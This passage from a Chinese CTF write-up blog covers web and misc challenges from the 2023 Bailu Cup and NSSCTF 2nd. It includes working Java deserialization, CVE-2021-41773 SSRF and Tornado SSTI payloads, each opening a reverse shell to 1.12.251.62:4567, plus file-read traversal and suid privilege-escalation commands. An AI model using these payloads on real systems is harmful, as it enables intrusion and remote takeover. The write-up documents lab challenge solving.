</span><br><span class="hljs-string">         哎，对了。拿走之前看一看我精心挑选的笑话吧：猎人打猎，朝狐狸开枪，“砰”地一声枪响之后猎人死了。狐狸叉着腰，冷笑一声：</span><br><span class="hljs-string">“没想到吧，我是反射弧。”好不好笑， 有没有感觉一哆嗦，大脑更清晰了。ฅ՞•ﻌ•՞ ต&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> heigth_list:<br>    ten_chr += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(i),<span class="hljs-number">8</span>))  <span class="hljs-comment">#8转10转ascii</span><br><span class="hljs-comment">#print(heigth_list)</span><br><span class="hljs-built_in">print</span>(ten_chr)<br><br>data = ten_chr.split(<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-comment">#print(data)</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(data[i]))<br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-commentspan><br></code></pre></td></tr></table></figure><p>base32-&gt;base64换表-&gt;base64</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493423.png" alt="img"></p><p>拿到一张rgb很混乱的图片，Piet隐写</p><p>用工具npiet</p><p>下载：<a href="https://www.bertnase.de/npiet/">https://www.bertnase.de/npiet/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">npiet.exe -tpic download.png <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023柏鹭杯</title>
    <link href="/2023/10/18/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/"/>
    <url>/2023/10/18/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="2023柏鹭杯"><a href="#2023柏鹭杯" class="headerlink" title="2023柏鹭杯"></a>2023柏鹭杯</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="express-fs"><a href="#express-fs" class="headerlink" title="express fs"></a>express fs</h2><p>参考：<a href="https://www.cnblogs.com/91ac0m0/p/17557039.html">https://www.cnblogs.com/91ac0m0/p/17557039.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">?file[protocol]=file:&amp;file[href]=a&amp;file[pathname]=fl%2561g.txt&amp;file[hostname]=&amp;file[origin]=x<br></code></pre></td></tr></table></figure><h2 id="综合题5"><a href="#综合题5" class="headerlink" title="综合题5"></a>综合题5</h2><p>源码中有<code>/readfile?filename=</code></p><p>目录穿越读文件<code>/../../../../../app/demo.jar</code></p><p>拿到源码</p><p>Upload.class，upload类中有混淆加密的flag1</p><p><img src="/../img/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/16976293252215.png" alt="img"></p><p>逆向一下得到flag1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReverseUpload</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">O0O</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;6925cc02789c1d2552b71acc4a2d48fd&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ReverseUpload</span> <span class="hljs-variable">uploader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReverseUpload</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalEncFlag1</span> <span class="hljs-operator">=</span> uploader.decryptEncFlag1();<br>        System.out.println(<span class="hljs-string">&quot;Original enc_flag1: &quot;</span> + originalEncFlag1);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">decryptEncFlag1</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64EncodedFlag1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA==&quot;</span>;<br>        <span class="hljs-type">byte</span>[] decodedBytes = Base64.getDecoder().decode(base64EncodedFlag1);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">decodedString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decodedBytes);<br><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">decryptedFlag</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; decodedString.length(); i++) &#123;<br>            <span class="hljs-type">char</span> <span class="hljs-variable">originalChar</span> <span class="hljs-operator">=</span> decodedString.charAt(i);<br>            <span class="hljs-type">char</span> <span class="hljs-variable">oOO</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.O0O.charAt(i % <span class="hljs-built_in">this</span>.O0O.length());<br>            <span class="hljs-type">char</span> <span class="hljs-variable">encryptedChar</span> <span class="hljs-operator">=</span> (<span class="hljs-type">char</span>) (originalChar ^ oOO);<br>            decryptedFlag.append(encryptedChar);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> decryptedFlag.toString();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//Original enc_flag1: flag&#123;ISEC-52e353a950c752b3dc8f0d1c949f0361&#125;</span><br></code></pre></td></tr></table></figure><h2 id="综合题6"><a href="#综合题6" class="headerlink" title="综合题6"></a><strong>综合题</strong>6</h2><p>源码中Ping.class是一个恶意类，readObject反序列化，exec可以命令执行</p><p><img src="/../img/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/16976293252171.png" alt="img"></p><p>通过Upload类的<code>/internalApi/v3.2/updateConfig</code>此路由可以反序列化加载恶意类Ping进行命令执行</p><p><img src="/../img/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/16976293252172.png" alt="img"></p><p>Ser.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Ser</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// Create a Ping object</span><br>        <span class="hljs-type">Ping</span> <span class="hljs-variable">ping</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ping</span>();<br>        ping.setCommand(<span class="hljs-string">&quot;bash&quot;</span>);<br>        ping.setArg1(<span class="hljs-string">&quot;-c&quot;</span>);<br>        ping.setArg2(<span class="hljs-string">&quot;bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEyLjI1MS42Mi80NTY3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span>);<br><br>        <span class="hljs-comment">// Serialize the Ping object to a byte array</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(ping);<br><br>        <span class="hljs-comment">// Encode the byte array to Base64</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray()));<br>        System.out.println(<span class="hljs-string">&quot;Payload: &quot;</span> + payload);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//Payload: rO0ABXNyABVjb20uZXhhbXBsZS5kZW1vLlBpbmcAAAAAAAAAAQIAA0wABGFyZzF0ABJMamF2YS9sYW5nL1N0cmluZztMAARhcmcycQB+AAFMAAdjb21tYW5kcQB+AAF4cHQAAi1jdABfYmFzaCAtYyAne2VjaG8sWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eExqRXlMakkxTVM0Mk1pODBOVFkzSURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfSd0AARiYXNo</span><br></code></pre></td></tr></table></figure><p>反弹shell</p><p><img src="/../img/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/16976293252183.png" alt="img"></p><p>find找suid，dig提权，<code>/usr/bin/dig -f /root/flag2</code></p><p><img src="/../img/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/16976293252184.png" alt="img"></p><h2 id="综合题7"><a href="#综合题7" class="headerlink" title="综合题7"></a>综合题7</h2><p>这题当时差一点时间没打出来，当时上传了msf马到服务器上搭好了隧道redis写了ssh的公钥</p><p>赛后看了很多师傅的wp，都是用frp代理进去，写公钥后连上去即可</p><p>具体参考</p><p><a href="http://blog.xmcve.com/2023/10/13/%E6%9F%8F%E9%B9%AD%E6%9D%AF2023-Writeup/#title-4">星盟</a><br><a href="https://www.cnblogs.com/V3g3t4ble/p/17757854.html">V3g3t4ble</a><br><a href="https://fushuling.com/index.php/2023/10/12/2023%e7%bd%91%e4%bf%a1%e6%9f%8f%e9%b9%ad%e6%9d%af%e5%a4%a7%e5%ad%a6%e7%94%9f%e7%bd%91%e7%bb%9c%e7%a9%ba%e9%97%b4%e5%ae%89%e5%85%a8%e7%b2%be%e8%8b%b1%e8%b5%9b/">fushulingのblog</a></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>每一行的空格数量为flag的ascii，转一下得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python">x = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;qd.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    aa = f.readlines()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> aa:<br>        x += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(i)-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(x)<br><span class="hljs-comment">#flag&#123;ISEC-eF8x2Bv1viw9eFvagivx0Ynv3jlai0vL&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF 2nd</title>
    <link href="/2023/09/18/NSSCTF%202nd/"/>
    <url>/2023/09/18/NSSCTF%202nd/</url>
    
    <content type="html"><![CDATA[<h1 id="NSSCTF-2nd"><a href="#NSSCTF-2nd" class="headerlink" title="NSSCTF 2nd"></a>NSSCTF 2nd</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="MyBox-revenge"><a href="#MyBox-revenge" class="headerlink" title="MyBox(revenge)"></a>MyBox(revenge)</h2><p>给了一个url的参数，可以利用file读文件</p><p><code>?url=file:///etc/passwd</code></p><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210687199.png)</p><p>ban了<code>/proc/1/environ</code>，<code>/start.sh</code>等非预期</p><p>读<code>/app/app.py</code>拿到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs Plain">from flask import Flask, request, redirect<br>import requests, socket, struct<br>from urllib import parse<br>app = Flask(__name__)<br><br>@app.route(&#x27;/&#x27;)<br>def index():<br>    if not request.args.get(&#x27;url&#x27;):<br>        return redirect(&#x27;/?url=dosth&#x27;)<br>    url = request.args.get(&#x27;url&#x27;)<br>    if url.startswith(&#x27;file://&#x27;):<br>        if &#x27;proc&#x27; in url or &#x27;flag&#x27; in url:<br>            return &#x27;no!&#x27;<br>        with open(url[7:], &#x27;r&#x27;) as f:<br>            data = f.read()<br>            if url[7:] == &#x27;/app/app.py&#x27;:<br>                return data<br>            if &#x27;NSSCTF&#x27; in data:<br>                return &#x27;no!&#x27;<br>            return data<br>    elif url.startswith(&#x27;http://localhost/&#x27;):<br>        return requests.get(url).text<br>    elif url.startswith(&#x27;mybox://127.0.0.1:&#x27;):<br>        port, cont    ent = url[18:].split(&#x27;/_&#x27;, maxsplit=1)<br>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        s.settimeout(5)<br>        s.connect((&#x27;127.0.0.1&#x27;, int(port)))<br>        s.send(parse.unquote(content).encode())<br>        res = b&#x27;&#x27;<br>        while 1:<br>            data = s.recv(1024)<br>            if data:<br>                res += data<br>            else:<br>                break<br>        return res<br>    return &#x27;&#x27;<br><br>app.run(&#x27;0.0.0.0&#x27;, 827)<br></code></pre></td></tr></table></figure><p>重点看23行<code>elif url.startswith(&#39;mybox://127.0.0.1:&#39;):</code>，建立了一个到127.0.0.1上的指定端口（827）的TCP的socket通信</p><p>相当于一个gopher协议的替换，即把gopher:&#x2F;&#x2F;127.0.0.1改成mybox:&#x2F;&#x2F;127.0.01</p><p>然后目的很明显了，gopher打ssrf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> urllib.parse<br>test =<span class="hljs-string">&quot;&quot;&quot;GET /flag HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:80</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;mybox://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-comment">#注意两次url编码</span><br><span class="hljs-built_in">print</span>(urllib.parse.quote(result))<br></code></pre></td></tr></table></figure><p>以为flag在当前目录，回显404，但是这里有一个关键，Apache版本为2.4.49，以前复现过的CVE-2021-41773，可以目录穿越</p><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210686831.png)</p><p>CVE-2021-41773的payload:<code>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> urllib.parse<br>test =<span class="hljs-string">&quot;&quot;&quot;GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:80</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 51</span><br><span class="hljs-string"></span><br><span class="hljs-string">bash -c &quot;bash -i &amp;&gt; /dev/tcp/1.12.251.62/4567 0&gt;&amp;1&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;mybox://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-built_in">print</span>(urllib.parse.quote(result))<br><span class="hljs-comment">#mybox%3A//127.0.0.1%3A80/_GET%2520/cgi-bin/.%25252e/.%25252e/.%25252e/.%25252e/.%25252e/bin/sh%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252051%250D%250A%250D%250Abash%2520-c%2520%2522bash%2520-i%2520%2526%253E%2520/dev/tcp/1.12.251.62/4567%25200%253E%25261%2522%250D%250A</span><br></code></pre></td></tr></table></figure><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210686832.png)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">daemon@d22eb7fdd4144138:/<span class="hljs-built_in">bin</span>$ cat /nevvvvvver_f1nd_m3_the_t3ue_flag<br><br>NSSCTF&#123;dfaa40bc-dab6-433a-a970-ec0e3b5ba084&#125;<br></code></pre></td></tr></table></figure><h2 id="MyHurricane"><a href="#MyHurricane" class="headerlink" title="MyHurricane"></a>MyHurricane</h2><p>参考<a href="https://blog.csdn.net/miuzzx/article/details/123329244">https://blog.csdn.net/miuzzx/article/details/123329244</a></p><p>开局源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> tornado.ioloop<br><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">import</span> os<br><br>BASE_DIR = os.path.dirname(__file__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">data</span>):<br>    bl = [<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;__&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;or&#x27;</span>, <span class="hljs-string">&#x27;and&#x27;</span>, <span class="hljs-string">&#x27;not&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>]<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> bl:<br>        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> data.split():<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> chunk:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-number">31</span> &lt; <span class="hljs-built_in">ord</span>(c) &lt; <span class="hljs-number">128</span>):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexHandler</span>(tornado.web.RequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            self.finish(f.read())<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self</span>):<br>        data = self.get_argument(<span class="hljs-string">&quot;ssti&quot;</span>)<br>        <span class="hljs-keyword">if</span> waf(data):<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(<span class="hljs-string">f&quot;&quot;&quot;&lt;html&gt;</span><br><span class="hljs-string">                        &lt;head&gt;&lt;/head&gt;</span><br><span class="hljs-string">                        &lt;body style=&quot;font-size: 30px;&quot;&gt;<span class="hljs-subst">&#123;data&#125;</span>&lt;/body&gt;&lt;/html&gt;</span><br><span class="hljs-string">                        &quot;&quot;&quot;</span>)<br>                f.flush()<br>            self.render(<span class="hljs-string">&#x27;1.html&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            self.finish(<span class="hljs-string">&#x27;no no no&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app = tornado.web.Application([<br>            (<span class="hljs-string">r&quot;/&quot;</span>, IndexHandler),<br>        ], compiled_template_cache=<span class="hljs-literal">False</span>)<br>    app.listen(<span class="hljs-number">827</span>)<br>    tornado.ioloop.IOLoop.current().start()<br></code></pre></td></tr></table></figure><p>tornado ssti，过滤了<code>[&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;__&#39;, &#39;(&#39;, &#39;)&#39;, &#39;or&#39;, &#39;and&#39;, &#39;not&#39;, &#39;&#123;&#123;', '&#125;&#125;&#39;]</code></p><p>过滤了<code>&#123;&#123;&#125;&#125;</code>用<code>&#123;%%&#125;</code>代替</p><p>过滤了and和or其实就是不能用<code>handler</code>和<code>import</code></p><p>这里利用了<code>_tt_utf8</code>进行变量覆盖，<code>set _tt_utf8=eval</code></p><p>原理</p><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210686833.png)</p><p>过滤了单引号和双引号，可能要加另一个变量替换（即$a($b)&amp;$b&#x3D;””），这里利用<code>request.body_arguments[request.method]</code>，返回的变量名为<code>GET</code>、<code>POST</code>…</p><p>最后payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python">ssti=&#123;% raw request.body_arguments[request.method][<span class="hljs-number">0</span>]%0a    _tt_utf8 = <span class="hljs-built_in">eval</span>%&#125;&amp;POST=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;%26 /dev/tcp/1.12.251.62/4567 &lt;%261&#x27;&quot;</span>)<br>ssti=&#123;% <span class="hljs-built_in">set</span> _tt_utf8 =<span class="hljs-built_in">eval</span> %&#125;&#123;% raw request.body_arguments[request.method][<span class="hljs-number">0</span>] %&#125;&amp;POST=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;%26 /dev/tcp/1.12.251.62/4567 0&lt;%261&#x27;&quot;</span>)<br><br><span class="hljs-comment">#非预期</span><br>ssti=&#123;% include /proc/<span class="hljs-number">1</span>/environ %&#125;<br></code></pre></td></tr></table></figure><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210686844.png)</p><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210686845.png)</p><p>flag在env中</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="gift-in-qrcode-revenge"><a href="#gift-in-qrcode-revenge" class="headerlink" title="gift_in_qrcode(revenge)"></a>gift_in_qrcode(revenge)</h2><p>给了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> qrcode<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randrange, getrandbits, seed<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br><br>flag = os.getenv(<span class="hljs-string">&quot;FLAG&quot;</span>)<br><span class="hljs-keyword">if</span> flag == <span class="hljs-literal">None</span>:<br>    flag = <span class="hljs-string">&quot;flag&#123;test&#125;&quot;</span><br><br>secret_seed = randrange(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>)<br>seed(secret_seed)<br>reveal = 